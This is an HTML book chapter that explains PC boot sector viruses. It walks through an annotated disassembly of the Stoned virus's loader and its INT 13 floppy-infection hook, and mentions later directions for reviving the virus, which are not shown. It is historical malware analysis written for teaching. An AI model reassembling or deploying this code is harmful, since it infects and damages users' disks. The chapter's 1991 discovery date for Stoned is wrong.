<html>

<head>
<meta http-equiv=Content-Type content="text/html; charset=windows-1252">
<meta name=Generator content="Microsoft Word 12 (filtered)">
<title>STONED PC Virus</title>
<style>
<!--
 /* Font Definitions */
 @font-face
	{font-family:Wingdings;
	panose-1:5 0 0 0 0 0 0 0 0 0;}
@font-face
	{font-family:"Cambria Math";
	panose-1:2 4 5 3 5 4 6 3 2 4;}
 /* Style Definitions */
 p.MsoNormal, li.MsoNormal, div.MsoNormal
	{margin:0in;
	margin-bottom:.0001pt;
	text-indent:.5in;
	font-size:12.0pt;
	font-family:"Times New Roman","serif";}
h1
	{margin-top:12.0pt;
	margin-right:0in;
	margin-bottom:3.0pt;
	margin-left:0in;
	text-indent:.5in;
	page-break-after:avoid;
	font-size:14.0pt;
	font-family:"Arial","sans-serif";}
h2
	{margin-top:12.0pt;
	margin-right:0in;
	margin-bottom:3.0pt;
	margin-left:0in;
	text-indent:.5in;
	page-break-after:avoid;
	font-size:12.0pt;
	font-family:"Arial","sans-serif";
	font-style:italic;}
h3
	{margin-top:12.0pt;
	margin-right:0in;
	margin-bottom:3.0pt;
	margin-left:0in;
	text-indent:.5in;
	page-break-after:avoid;
	font-size:12.0pt;
	font-family:"Arial","sans-serif";
	font-weight:normal;}
p.MsoHeader, li.MsoHeader, div.MsoHeader
	{margin:0in;
	margin-bottom:.0001pt;
	text-indent:.5in;
	font-size:12.0pt;
	font-family:"Times New Roman","serif";}
p.MsoFooter, li.MsoFooter, div.MsoFooter
	{margin:0in;
	margin-bottom:.0001pt;
	text-indent:.5in;
	font-size:12.0pt;
	font-family:"Times New Roman","serif";}
p.MsoCaption, li.MsoCaption, div.MsoCaption
	{margin-top:6.0pt;
	margin-right:0in;
	margin-bottom:6.0pt;
	margin-left:0in;
	text-indent:.5in;
	line-height:150%;
	font-size:12.0pt;
	font-family:"Times New Roman","serif";
	font-weight:bold;}
p.MsoBodyTextIndent, li.MsoBodyTextIndent, div.MsoBodyTextIndent
	{margin:0in;
	margin-bottom:.0001pt;
	text-indent:.5in;
	font-size:12.0pt;
	font-family:"Times New Roman","serif";}
a:link, span.MsoHyperlink
	{color:blue;
	text-decoration:underline;}
a:visited, span.MsoHyperlinkFollowed
	{color:purple;
	text-decoration:underline;}
p.MsoPlainText, li.MsoPlainText, div.MsoPlainText
	{margin:0in;
	margin-bottom:.0001pt;
	text-indent:.5in;
	font-size:12.0pt;
	font-family:"Courier New";}
p.Panel, li.Panel, div.Panel
	{mso-style-name:Panel;
	margin:0in;
	margin-bottom:.0001pt;
	border:none;
	padding:0in;
	font-size:8.0pt;
	font-family:"Courier New";
	layout-grid-mode:line;}
p.Outline, li.Outline, div.Outline
	{mso-style-name:Outline;
	margin:0in;
	margin-bottom:.0001pt;
	font-size:12.0pt;
	font-family:"Times New Roman","serif";
	color:teal;}
 /* Page Definitions */
 @page Section1
	{size:8.5in 11.0in;
	margin:1.0in 65.95pt 1.0in 65.95pt;}
div.Section1
	{page:Section1;}
 /* List Definitions */
 ol
	{margin-bottom:0in;}
ul
	{margin-bottom:0in;}
-->
</style>

</head>

<body lang=EN-US link=blue vlink=purple>

<div class=Section1>

<h1 align=center style='text-align:center'><span style='font-size:20.0pt'>Chapter
6. The Computer Virus</span></h1>

<p class=MsoNormal>&nbsp;</p>

<p class=MsoNormal>Computer viruses are a fascinating part of our computer
civilization. These tiny, parasitic code fragments inject themselves into the
disk image of other programs. As users share programs (an unsanitary and often
illegal practice), these viruses spread from machine to machine proliferating
geometrically.</p>

<p class=MsoNormal>Like their biological counterparts, computer viruses
occasionally mutate. Hackers, eager to show their coding prowess, disassemble
viruses and change their functions. Often the change is for the worst causing
damage to countless hard-drives – beware the darkside of computer archeology.</p>

<p class=MsoNormal>Some viruses, like the Stoned virus we will be looking at
shortly, do nothing more than print a message on the screen. Aside from a
slight drop in system performance, the user is mostly unaffected by the virus.
Some viruses contain code-bugs that affect their potency. The Internet Worm we
will see shortly is a good example. It was supposed to be rather benign, but
because of bugs, it inadvertently crippled thousands of machines at a
considerable monetary cost.</p>

<p class=MsoNormal>Some viruses are humorous; the Green Caterpillar virus
(called the 1591 virus because of its code size) scrolls a green caterpillar
down the text screen. Other viruses are designed specifically to do damage. The
Michelangelo virus (a close cousin to the Stoned virus) gets media attention
every year. This virus hides in the background of a computer silently spreading
from machine to machine until March 6<sup>th</sup>, the birthday of the famous
16<sup>th</sup> century Italian artist. On that day, the virus quickly erases
the computer’s hard-drive.</p>

<p class=MsoBodyTextIndent>Before we look at the complete disassembly of the
Stoned virus, I must remind you that Federal law provides severe penalties for
computer crimes – crimes like releasing a computer virus into the computing
community. But we are computer archeologists, right? We are only interested in
seeing how a virus works, and the Stoned virus is an intriguing archeological
find.</p>

<p class=MsoNormal>We’ll also take a close look at a fragment of VAX assembly used
in the Internet Worm of 1988. Morris’s worm exploited several holes in the UNIX
operating system. His worm and others have lead system designers to strengthen
and secure operating systems for the rest of us. Still, handing me a
white-paper is more polite than shutting down my machine!</p>

<p class=MsoNormal>Then, as an aside, we’ll wrap up the chapter with a look at
the complete genetic code for a biological virus – the Eggplant Mosaic Virus.
We aren’t biologists, but we can apply computing concepts to the workings of
DNA. The parallels are thought provoking.</p>

<h1>The PC Virus</h1>

<p class=MsoNormal>Viruses have attacked all computing platforms, but PCs seem
particularly susceptible. It’s no great mystery why. The PC was designed for
home use, which meant IBM had to cut certain corners to keep the price down.
These cutbacks opened the door for viruses.</p>

<p class=MsoNormal>The first cut corner was the processor. VAX and SUN CPUs
have memory protection built into the processor. This is a must for any serious
multi-user system. But the PC was designed for a single user – a user that
would have free reign on the system. Of course that means a virus executed by
the user also has free reign on the system.</p>

<p class=MsoNormal>The second cut corner was the operating system media.
Hard-drives weren’t popular when PCs first arrived on the scene. They were
small and expensive (small in capacity but large in physical size!). To reach
everyday users, the DOS operating system had to fit on a 560KB floppy. That
left little room for process-multitasking or login security – and forget a
windowing environment. </p>

<p class=MsoNormal>Application vendors were also restricted to the floppy.
Floppies are very portable and very easy to copy. Before long, the Sneakernet
sprung to life – a network of friends passing illegal copies of software among
themselves. No hardware security, no operating system security, and portable,
easy to duplicate application disks – the PC world was a fertile ground for the
virus. </p>

<p class=MsoNormal>But the heart of the computer viruses is the 8086 interrupt
structure. As we will see, this scheme invites future upgrades to extend the
base operating system by overriding system calls (a powerful object-oriented
concept). Thus viruses are simply malicious OS upgrades!</p>

<h2>The 8086 Interrupt Structure</h2>

<p class=MsoNormal>We saw the interrupt structure for the 8085 earlier in
Chapter X. Remember the eight, 8-byte handler routines burned into ROM? Small,
frequently called utility routines could be placed into the slots that weren’t
taken by hardware. The 8085 instruction set allowed the developer to invoke
these functions quickly with a one-byte opcode.</p>

<p class=MsoNormal>The next member of the Intel family, the 8086 took software
interrupts to a new level. Instead of eight interrupt levels, the 8086 supports
256! Interrupts are stilled mapped into the first chunk of memory, but now
interrupt handler routines are “pointed to” by 256, four-byte far-pointers. The
first four bytes of memory point to the service routine for interrupt 0. The
next four bytes point to the service routine for interrupt 1 and so on filling
the entire first 1K of memory.  Why four bytes for a pointer? The 8086 uses a
segmented memory scheme with a 2-byte segment address and a 2-byte offset
address. See Apendix A for a refresher on the 8086 system architecture.</p>

<p class=MsoNormal>During an interrupt cycle, a hardware device places its
interrupt number on the CPU data bus. The CPU multiplies this number by four
and fetches the four-byte memory pointer. It then pushes the flags on the stack
and performs a far CALL to the interrupt handler. </p>

<p class=MsoNormal>In an 8085 system, the ROM was mapped first in the address
space. In the 8086, RAM comes first. This means that the interrupt table is in
RAM and can be changed on the fly. As the operating system loads, it sets the
interrupt vectors to point to the individual service routines. Thus the
functionality of old hardware service routines can be upgraded periodically
with new device drivers. New hardware devices ship with software that registers
interrupt service routines in the appropriate vector. </p>

<p class=MsoNormal>Of course, keeping up with which device uses which interrupt
can be a pain. There are some reserved vectors on typical PC systems. Interrupt
0 is called whenever the CPU tries to perform a division by 0. Interrupt 1 is
the singlestep interrupt used for debugging code. Interrupt 8 is tied to a
hardware clock. This interrupt is called regularly, and the system clock
usually depends on this routine to increment a memory counter (the Stoned virus
reads this counter).</p>

<p class=MsoNormal>Very few 8086 systems have 256 interrupting devices! The
lion’s share of the interrupt vectors are used as software interrupts. A
program can invoke any interrupt routine through the INT XX command, where XX
is the interrupt number from 00 to FF hex.</p>

<p class=MsoNormal>The BIOS establishes a few low-level routines that other
programs can invoke. INT 10 is a complex video driver that manages the console
window. Parameters passed into this function through the registers control a
number of sub-functions that do things like loading fonts, scrolling the
screen, and printing strings. INT 12 returns the amount of conventional memory
in 1K chunks. INT 18 invokes the BASIC ROM (what a language). You can call INT
19 to reboot the machine. Through INT 13, programs can access sectors on disk
drives connected to the system.</p>

<p class=MsoNormal>The ROM designers could have avoided the indirection of
interrupt vectors by publishing a list of ROM routine addresses for programs to
call directly. The RAM vector allows the BIOS to be upgraded by the operating
system loaded from disk. Suppose the DOS designers had come up with a better
way to access sectors on a disk. The ROM code is unchangeable, but DOS could change
the INT 13 vector to point to the newer routines loaded from disk. Existing
programs don’t have to be told a new routine address – they continue to use the
routine indirectly through the INT 13 vector.</p>

<p class=MsoNormal>To encourage others to design hardware for their computers,
IBM published the specs on the hardware bus used in the PC. Other people began
to make hardware cards for the PC, which made PCs more attractive. The Intel
8086 chip was available to the public, and other vendors began to use the chip
to build PC clones – machines identical to the IBM PC save for the ROM code.
The true PC ROM was the property of IBM, but compatible ROMs only had to mimic
the IBM machines by setting up interrupt vectors that pointed to routines that
performed the same basic functions.</p>

<p class=MsoNormal>There is an obvious disadvantage to “hanging” system calls
on indirect software interrupt hooks: any program is free to change any of the
vectors at any time. For instance, a program could remember the destination of
a specific interrupt, say INT 13, and change the vector to point to a new
routine. This new routine could perform some meaningful task (say, infecting a
floppy disk) before calling the original handler routine.  This is how a virus
gets CPU time, but what does it mean to infect a floppy?</p>

<h2>Bootsector Viruses</h2>

<p class=MsoNormal>When you turn on the power to a PC or hit its reset button,
the processor jumps to location FFFF:0000 in the memory map (physical address
FFFF0).That means at least part of the ROM must be mapped into the end of the
address space with the last sixteen being the first thing the processor
executes.</p>

<p class=MsoNormal>The code at this location jumps backwards to an involved
initialization routine that performs diagnostics and a memory check.
Initialization is important, but this init code is relatively small. The meat
of the ROM is a number of utility routines designed to be used by other
programs. The initialization code sets the interrupt vectors to point to these
routines accordingly – again, these are routines like INT 8 (the hardware
timer-tick handler) and INT 13 (primitive disk sector access methods).</p>

<p class=MsoNormal>Finally, the ROM loads the very first sector from the
boot-disk into memory at 0000:7C00 and executes it. This first sector is called
the bootsector. It is a small program that immediately loads the true operating
system, whatever that may be, from the remainder of the disk. Actually, this is
quite ingenious. The ROM doesn’t have to know anything at all about the various
operating systems as they evolve over time. Operating systems simply supply a
bootsector program that knows the details.</p>

<p class=MsoNormal>The ROM performs a sanity check on the bootsector before it
executes it. It checks to see if the first instruction in the sector is a JMP
statement. Normally the jump takes the CPU beyond a small media descriptor
table that describes the disk’s configuration (number of heads, number of
sectors, etc). If the bootsector contains a signature jump statement, the ROM
executes it by setting the CS register to 0000 and the IP to 7C00. Here is the
code from the ROM of my old 286 machine. It performs the transfer from ROM to
the operating system.</p>

<p class=MsoNormal>&nbsp;</p>

<div>

<table cellspacing=0 cellpadding=0 hspace=0 vspace=0 align=left>
 <tr>
  <td valign=top align=left style='padding-top:9.35pt;padding-right:9.35pt;
  padding-bottom:9.35pt;padding-left:9.35pt'>
  <div style='border:solid windowtext 1.0pt;padding:1.0pt 4.0pt 1.0pt 4.0pt'>
  <p class=Panel style='border:none;padding:0in'>; ROM BIOS BOOTSTRAP</p>
  <p class=Panel style='border:none;padding:0in'>; This is where control is
  transferred to the loaded bootsector</p>
  <p class=Panel style='border:none;padding:0in'>...</p>
  <p class=Panel style='border:none;padding:0in'>F000:F80B EA007C000000     JMP    0000:7C00</p>
  <p class=Panel style='border:none;padding:0in'>...</p>
  </div>
  </td>
 </tr>
</table>

</div>

<p class=MsoNormal>&nbsp;</p>

<p class=MsoNormal>Bootsector programs have to be small; they have to fit in a
512 byte floppy-disk sector. The DOS bootsector simply loads the two hidden
system files IO.SYS and MSDOS.SYS. MSDOS.SYS contains the DOS interrupt, INT
21. This is a massive interrupt handler with lots of subcommands selected by
passing arguments through the AX register. Eventually, the DOS shell
COMMAND.COM is loaded into memory. This is simply a program that reads commands
from the keyboard and passes them to INT 21.</p>

<p class=MsoNormal>The Stoned virus discovered in April of 1991 was one of the
first computer viruses on the PC scene. It is a special species of virus known
as a “bootsctor virus”. As the name suggests, viruses of this type infect the
bootsector of an operating system’s boot disk. As we will see, their operation
is eloquent in its simplicity. </p>

<p class=MsoNormal>The orignal bootsector of an infected disk has been copied
elsewhere on the disk and the virus has been placed in the bootsector. When the
PC boots up, it unknowingly loads the virus into memory at 0000:7C00 and
executes it. The virus moves to a permanent home in upper memory and changes
the INT 13 vector to point to a special routine in the virus code. At this
point, the virus usually infects any fixed-disk on the system. Then it loads
the original bootsector into memory at 0000:7C00 and executes it. DOS loads
unaware of the new INT13 routine. </p>

<p class=MsoNormal>Every program performs disk access through INT 13 (using the
DOS routines through INT 21 won’t save you since INT21 ends up calling INT13).
Thus every program activates the virus every time it touches a disk. The viral
routine secretly makes sure the bootsector of the accessed floppy has been
infected before passing the disk request on to the normal INT13. The slight
delay usually goes unnoticed by the calling program. Since COMMAND.COM makes
use of  INT13, something as high-level as doing a DIR on a floppy will trigger
an infection.</p>

<p class=MsoNormal>Despite their limited code space, bootsector viruses usually
find a few extra bytes to do something special. The Stoned virus randomly
prints the message “Your PC is now STONED!” when the computer is booting up.
The Michelagelo virus, also a bootsector virus, erases the disk of the booting
computer if the system date is March 6<sup>th</sup>.</p>

<p class=MsoNormal>The really complex viruses (the Green Caterpillar for
instance) operate a little differently. Instead of attacking a disk’s boot
sector, they infect every executable file they come in contact with by tagging
onto the end of the executable-file and changing the entry point to execute the
virus first. Once the virus has executed and made itself “resident”, it starts
the host program at its original entry point. Becoming resident involves
hooking into the DOS interrupt, INT21, and overriding the functions that open
files. Thus whenever a file is opened by any program (including COMMAND.COM),
the virus is triggered to attempt an infestation. COM files and EXE files have
to be infected differently, and the code for these viruses tends to be longer
than we could tackle here. </p>

<p class=MsoNormal>There is something charming about the compact-simplicity of
the bootsector viruses, especially the classic example: Stoned. Without further
adieu, let’s dig in.</p>

<h2>Overview</h2>

<p class=MsoNormal>The Stoned virus has two basic parts: a Loader that gets
called when the bootsector is loaded, and an Infector that replaces the INT13
vector. The virus jumps from the entry point at location 0000 to the Loader at
00A1. </p>

<p class=MsoNormal>There is a 13-byte storage area at 0008. We will see how
this memory is used when we get to the walk-through.</p>

<p class=MsoNormal>Locations 0015 through 00A0 hold the Infector routine – the
replacement INT13 that other programs call when they need to perform disk I/O.
The code at 0066 checks to see if the bootsector on the floppy has been
infected, and the code at 0079 performs the infection if needed. Location 0035
passes the incoming request to the original INT13.</p>

<p class=MsoNormal>Locations 00A1 through 01B7 hold the Loader routine – the
code fragment that moves the virus into safe memory, registers the Infector
INT13, and executes the original bootsector. Beginning at 00B8, the virus
reserves permanent memory at the end of RAM. At 00D8, the virus is transferred
to upper memory where execution continues.</p>

<p class=MsoNormal>The code at 00E4 loads the original bootsector from either
the floppy or hard-disk depending on how the machine is booting. The Stoned
message is printed from the code at 0118. The jump at 0154 executes the
original bootsector. The code at 0159 infects the hard-drive being careful to
preserve the partition table, and two ASCII strings are tagged onto the end of
the virus beginning at 0189.</p>

<h2>Code Walkthrough</h2>

<p class=MsoBodyTextIndent>Here is the commented disassembly of the Stoned
virus in its entirety without regard for any copyrights! Actually, a virus is
the ultimate in shareware – it’s free, and you get it whether you want it or
not.</p>

<p class=MsoNormal>Remember that the Intel 8x86 chips are little-endians; the
least significant byte of a word is stored first in memory. The disassembler I
used to generate the listing below conveniently re-orders the bytes of a word
for easier reading. Whenever you see a four-digit number, the actual bytes are
stored in reverse order. You’ll need to remember this if you are going to follow
my directions later to bring the virus back to life!</p>

<p class=MsoNormal>When the program starts, it is in memory at 0000:7C00. As we
saw earlier, the ROM bootstrap loads the bootsector into memory at this
location, checks for a signature JMP statement (evidently any kind of jump will
do), and then executes the program by setting the code segment to 0000 and the
instruction pointer to 7C00. </p>

<p class=MsoNormal>The virus will eventually move itself around in memory and
copy itself to disk. The math for these operations is much easier if the offset
is 0000. The program’s first action is to re-align the CS register so that the
virus is at the beginning of segment 07C0. The far jump at location 0000 does
nothing more than jump to the very next instruction changing the CS and IP
registers along the way. The second instruction is a short (relative) jump over
the Infector code and some storage to the Loader at 00A1.</p>

<p class=MsoNormal>&nbsp;</p>

<div>

<table cellspacing=0 cellpadding=0 hspace=0 vspace=0 align=left>
 <tr>
  <td valign=top align=left style='padding-top:9.35pt;padding-right:9.35pt;
  padding-bottom:9.35pt;padding-left:9.35pt'>
  <div style='border:solid windowtext 1.0pt;padding:1.0pt 4.0pt 1.0pt 4.0pt'>
  <p class=Panel style='border:none;padding:0in'>STONED PC COMPUTER VIRUS </p>
  <p class=Panel style='border:none;padding:0in'>(BOOTSECTOR INFECTOR)</p>
  <p class=Panel style='border:none;padding:0in'>&nbsp;</p>
  <p class=Panel style='border:none;padding:0in'>; This jump is checked by the
  ROM to verify that a valid bootsector is present.</p>
  <p class=Panel style='border:none;padding:0in'>0000: EA 05 00 C0 07   
  JMP     07C0:0005               ; 07C0 is where the bootsector is</p>
  <p class=Panel style='border:none;padding:0in'>                                                       
  ; loaded. Jump to next instruction.               </p>
  <p class=Panel style='border:none;padding:0in'>                                                       
  ; (Re-orient the CS along the way)</p>
  <p class=Panel style='border:none;padding:0in'>&nbsp;</p>
  <p class=Panel style='border:none;padding:0in'>0005: E9 0099          
  JMP     00A1                    ; Jump over data and Infector</p>
  <p class=Panel style='border:none;padding:0in'>&nbsp;</p>
  <p class=Panel style='border:none;padding:0in'>0008: 00        ; Media
  source. 0 if loaded from a floppy, 2 from a fixed disk.</p>
  <p class=Panel style='border:none;padding:0in'>;     Offs Seg</p>
  <p class=Panel style='border:none;padding:0in'>0009: xxxx xxxx ; Original INT
  13 vector</p>
  <p class=Panel style='border:none;padding:0in'>000D: 00E4 xxxx ; Resident
  virus location in memory      (used for easy JMP)</p>
  <p class=Panel style='border:none;padding:0in'>0011: 7C00 0000 ; Pointer to
  original bootsector memory (used for easy JMP)</p>
  </div>
  </td>
 </tr>
</table>

</div>

<p class=MsoNormal>&nbsp;</p>

<p class=MsoNormal>Anytime you find two absolute jumps together in a control
flow a red flag should get raised. Why jump from location 0000 to location 0005
and then from location 0005 to 00A1? Why not just jump from 0000 directly to
00A1? The extra jump instruction wastes three bytes of memory. On this dig we
are going to identify several places where bytes could be saved!</p>

<p class=MsoNormal>The virus uses a 13-byte data-area beginning at 0008. The
first byte of this data is a flag that describes what kind of disk the
bootsector was loaded from. If the byte is 0, the bootsector was loaded from a
floppy. If the byte is 2, the bootsector was loaded from a fixed disk. The
virus moves the original bootsector to a “free” sector elsewhere on the disk.
The location of this sector is different for floppies and hard-disks, as we
will see. This flag is the virus’s only way of knowing where to find the
original bootsector needed to bring the computer up once the virus has
initialized.</p>

<p class=MsoNormal>As the virus loads, it fills the four bytes at 0009 with the
segment and offset of the address of the original INT 13 vector (pointing
somewhere in ROM). This will be used to pass requests on to the original disk
I/O handler.</p>

<p class=MsoNormal>The four bytes at 000D are used as an indirect reference to
transfer control to the virus when it is copied into permanent memory. We’ll
see how this works shortly, but notice that the offset is already known – the
virus simply fills in the segment address of its new home. Likewise, the four
bytes at 0011 are used as an indirect reference to the original bootsector when
the virus has loaded.  Neither of these indirect pointers is really needed, as
we will see.</p>

<h3>The Infector</h3>

<div>

<table cellspacing=0 cellpadding=0 hspace=0 vspace=0 align=left>
 <tr>
  <td valign=top align=left style='padding-top:9.35pt;padding-right:9.35pt;
  padding-bottom:9.35pt;padding-left:9.35pt'>
  <div style='border:solid windowtext 1.0pt;padding:1.0pt 4.0pt 1.0pt 4.0pt'>
  <p class=Panel style='border:none;padding:0in'>;-----------------------------------------------------------------</p>
  <p class=Panel style='border:none;padding:0in'>; Infector</p>
  <p class=Panel style='border:none;padding:0in'>;-----------------------------------------------------------------</p>
  <p class=Panel style='border:none;padding:0in'>; New INT 13 handler</p>
  <p class=Panel style='border:none;padding:0in'>0015: 1E               
  PUSH    DS                      ; Hold ...</p>
  <p class=Panel style='border:none;padding:0in'>0016: 50                PUSH   
  AX                      ; ... incoming parameters</p>
  <p class=Panel style='border:none;padding:0in'>0017: 80 FC 02         
  CMP     AH,02                   ; Is this a READ SECTOR request?</p>
  <p class=Panel style='border:none;padding:0in'>001A: 72 17            
  JB      0033                    ; Ingore all requests ...</p>
  <p class=Panel style='border:none;padding:0in'>001C: 80 FC 04          CMP    
  AH,04                   ; ... except ...</p>
  <p class=Panel style='border:none;padding:0in'>001F: 73 12            
  JNB     0033                    ; ... READ = 2 or WRITE = 3 ...</p>
  <p class=Panel style='border:none;padding:0in'>0021: 0A D2            
  OR      DL,DL                   ; ... to drive 0 ...</p>
  <p class=Panel style='border:none;padding:0in'>0023: 75 0E            
  JNZ     0033                    ; ... (floppy)</p>
  <p class=Panel style='border:none;padding:0in'>0025: 33 C0            
  XOR     AX,AX                   ; Set the DS register ...</p>
  <p class=Panel style='border:none;padding:0in'>0027: 8E D8            
  MOV     DS,AX                   ; ... to 0000</p>
  <p class=Panel style='border:none;padding:0in'>; The first sector in a group
  written to disk starts the drive motor. This check is a way</p>
  <p class=Panel style='border:none;padding:0in'>; for the virus to check the
  bootsector only on the first sector in a group and not</p>
  <p class=Panel style='border:none;padding:0in'>; on every sector which would
  bring the disk access to a crawl.</p>
  <p class=Panel style='border:none;padding:0in'>0029: A0 043F          
  MOV     AL,[DS:043F]            ; Check to see if drive motor is ...</p>
  <p class=Panel style='border:none;padding:0in'>002C: A8 01            
  TEST    AL,01                   ; ... already turned on.</p>
  <p class=Panel style='border:none;padding:0in'>002E: 75 03            
  JNZ     0033                    ; Yes ... don't do anything</p>
  <p class=Panel style='border:none;padding:0in'>0030: E8 0007          
  CALL    003A                    ; Do any viral infection</p>
  <p class=Panel style='border:none;padding:0in'>0033: 58               
  POP     AX                      ; Restore original ...</p>
  <p class=Panel style='border:none;padding:0in'>0034: 1F               
  POP     DS                      ; ... incoming parameters</p>
  <p class=Panel style='border:none;padding:0in'>0035: 2E FF 2E 09 00   
  JMP     FAR [CS:0009]           ; Execute the original INT 13</p>
  </div>
  </td>
 </tr>
</table>

</div>

<p class=MsoNormal>&nbsp;</p>

<p class=MsoNormal>At this point, the Loader has long since finished its work;
the virus is safe in the upper area of conventional memory. The virus has been
“hooked into” INT 13 by remembering the original vector in its data-area and
changing the INT vector to point to 0015. Location 0015 is then called by some
poor, unsuspecting program needing disk access. The virus comes to life and
does its thing (infecting floppies) and then silently passes the request on to
the original handler. The calling program is none the wiser.</p>

<p class=MsoNormal>The virus passes all functions except reading or writing a
sector on the floppy straight through to the original INT13 handler. When a
floppy read or write occurs, the above section of code calls the following
routine that infects the bootsector of the floppy if it isn’t already infected
– but the jump is only taken if the lowest bit of location 0000:043F is off. </p>

<p class=MsoNormal>This bit represents the state of the floppy-drive’s motor.
If the bit is one, the drive is running. If the bit is zero, the drive is off.
This is really a clever check that keeps the virus from taking action with
every single sector read or write. Data is usually accessed as a stream of
sectors. The first sector requested gets the motor going, and the motor
continues to run while the remaining data is transferred. (Actually the motor
continues to run for a few seconds after the last sector is accessed.) By
watching the motor, the virus only takes effect on the first sector in a stream
of sectors. Otherwise, the user would notice a terrible drop in performance for
disk access. Again, this check is quite clever.</p>

<p class=MsoNormal>&nbsp;</p>

<div>

<table cellspacing=0 cellpadding=0 hspace=0 vspace=0 align=left>
 <tr>
  <td valign=top align=left style='padding-top:9.35pt;padding-right:9.35pt;
  padding-bottom:9.35pt;padding-left:9.35pt'>
  <div style='border:solid windowtext 1.0pt;padding:1.0pt 4.0pt 1.0pt 4.0pt'>
  <p class=Panel style='border:none;padding:0in'>; Try to infect Drive A</p>
  <p class=Panel style='border:none;padding:0in'>;</p>
  <p class=Panel style='border:none;padding:0in'>003A: 53               
  PUSH    BX                      ; Save all ...</p>
  <p class=Panel style='border:none;padding:0in'>003B: 51               
  PUSH    CX                      ; ...</p>
  <p class=Panel style='border:none;padding:0in'>003C: 52               
  PUSH    DX                      ; ...</p>
  <p class=Panel style='border:none;padding:0in'>003D: 06               
  PUSH    ES                      ; ...</p>
  <p class=Panel style='border:none;padding:0in'>003E: 56               
  PUSH    SI                      ; ...</p>
  <p class=Panel style='border:none;padding:0in'>003F: 57               
  PUSH    DI                      ; ... registers</p>
  <p class=Panel style='border:none;padding:0in'>0040: BE 0004          
  MOV     SI,0004                 ; 4 attempts (motor warm up)</p>
  <p class=Panel style='border:none;padding:0in'>0043: B8 0201          
  MOV     AX,0201                 ; Read one sector</p>
  <p class=Panel style='border:none;padding:0in'>0046: 0E               
  PUSH    CS                      ; Set ES to point ...</p>
  <p class=Panel style='border:none;padding:0in'>0047: 07               
  POP     ES                      ; ... to code segment</p>
  <p class=Panel style='border:none;padding:0in'>0048: BB 0200          
  MOV     BX,0200                 ; Just past the virus in memory</p>
  <p class=Panel style='border:none;padding:0in'>004B: 33 C9            
  XOR     CX,CX                   ; Cyl 0, Sect 1 (shortly)</p>
  <p class=Panel style='border:none;padding:0in'>004D: 89 CA            
  MOV     DX,CX                   ; Head 0, Drive 0</p>
  <p class=Panel style='border:none;padding:0in'>004F: 41               
  INC     CX                      ; Now Cyl 1</p>
  <p class=Panel style='border:none;padding:0in'>0050: 9C               
  PUSHF                           ; Set stack as if an interrupt</p>
  </div>
  </td>
 </tr>
</table>

</div>

<p class=MsoNormal>&nbsp;</p>

<p class=MsoNormal>The infection process first preserves all the incoming
parameters and sets up a call to the original INT13 to load the bootsector of
the floppy into memory just after the virus.  Note the PUSHF instruction at
0050. The original INT13 is an interrupt handler, and its last instruction is
an RETI – RETurn from Interrupt. Since the virus will be CALLing the routine,
it must push the flags onto the stack to simulate an INT. Otherwise, too much
information is popped off the stack with the RETI, and the CPU crashes.</p>

<p class=MsoNormal>&nbsp;</p>

<div>

<table cellspacing=0 cellpadding=0 hspace=0 vspace=0 align=left>
 <tr>
  <td valign=top align=left style='padding-top:9.35pt;padding-right:9.35pt;
  padding-bottom:9.35pt;padding-left:9.35pt'>
  <div style='border:solid windowtext 1.0pt;padding:1.0pt 4.0pt 1.0pt 4.0pt'>
  <p class=Panel style='border:none;padding:0in'>0051: 2E FF 1E 09 00   
  CALL    FAR [CS:0009]           ; Read bootsector with INT 13</p>
  <p class=Panel style='border:none;padding:0in'>0056: 73 0E            
  JNB     0066                    ; Got it ... move on.</p>
  <p class=Panel style='border:none;padding:0in'>0058: 33 C0            
  XOR     AX,AX                   ; Reset drive command</p>
  <p class=Panel style='border:none;padding:0in'>005A: 9C               
  PUSHF                           ; Set stack as if an interrupt</p>
  <p class=Panel style='border:none;padding:0in'>005B: 2E FF 1E 09 00   
  CALL    FAR [CS:0009]           ; Reset drive with INT 13</p>
  <p class=Panel style='border:none;padding:0in'>0060: 4E               
  DEC     SI                      ; All attempts tried?</p>
  <p class=Panel style='border:none;padding:0in'>0061: 75 E0            
  JNZ     0043                    ; No ... keep trying</p>
  <p class=Panel style='border:none;padding:0in'>0063: EB 35            
  JMP     009A                    ; Couldn't do it ... out</p>
  <p class=Panel style='border:none;padding:0in'>0065: 90               
  NOP                             ; (Assembler fill)</p>
  </div>
  </td>
 </tr>
</table>

</div>

<p class=MsoNormal>&nbsp;</p>

<p class=MsoNormal>The NOP instruction at 0065 is confusing at first glance.
The jump at 0056 jumps over the NOP to location 0066, and no other jump in the
code brings the CPU back to location 0065. This is simply a wasted byte with no
other function than to take up space. Why would a programmer, already limited
to a sector’s worth of code, waste a byte with a NOP that is never hit?</p>

<p class=MsoNormal>The answer is – the programmer didn’t do it. This extra
instruction was actually inserted by the assembler! Have a look at the opcode
for another JMP statement early in the code at location 0005. E9 is the JMP
opcode followed by a two-byte, signed offset. Adding 0099 to 0008 (the location
of the next instruction) puts the destination of the jump at 00A1.</p>

<p class=MsoNormal>Unlike the E9 absolute-jump, all of the conditional-jumps
(like the one at location 0061 above) use a single-byte, signed offset. Thus
conditional jumps cannot jump to code more than about 128 bytes away in either
direction. This makes good sense; conditional jumps are very frequent, and they
are normally used to jump over an instruction or two or back up to the top of a
short loop. Designing the instruction set with single-byte-offset conditional
jumps makes for tight code, and it works for about 99% of all cases. For the
rare, longer conditional jumps, programmers must branch out to a nearby
absolute JMP statement that can reach anywhere in the segment – or beyond.</p>

<p class=MsoNormal>The EB opcode at 0063 is a type of conditional jump (with a
single byte offset) except that the condition is always true. For short jumps,
programmers can use this single-byte-offset form of JMP rather than wasting an
extra byte on an offset with an MSB of 00.</p>

<p class=MsoNormal>The trouble comes when the assembler is allowed to choose
between the two forms of jump. Remember that assemblers make two passes while
building an object file. On the first pass, the assembler calculates the memory
location of all labels in the program; this is easy since instructions have
fixed lengths. On the second pass, the assembler uses the label-table to build
the opcodes and operands for the instructions. </p>

<p class=MsoNormal>When the assembler comes to a JMP statement on the first
pass where the label’s address has already been resolved (a backward jump), the
assembler can easily calculate the distance back to the label and use a
one-byte or two-byte offset as appropriate. When it comes to a JMP statement
where the address for the label is not known (a forward jump to a label not
defined yet), it has no way of knowing if the destination is within reach of a
single-byte offset. It must assume the worst and treat the jump as a two-byte
offset.</p>

<p class=MsoNormal>On the second pass, all of the labels are known – but they
are stubbornly established. When the assembler recognizes that a forward jump
is actually a one-byte jump, it sticks in the single byte form of the jump
(which executes a bit faster) and pads the previously reserved space with an
arbitrary value. Any value will do since the byte will never get executed, but
the safest byte is the NOP instruction. This is what we are seeing in the virus
code.</p>

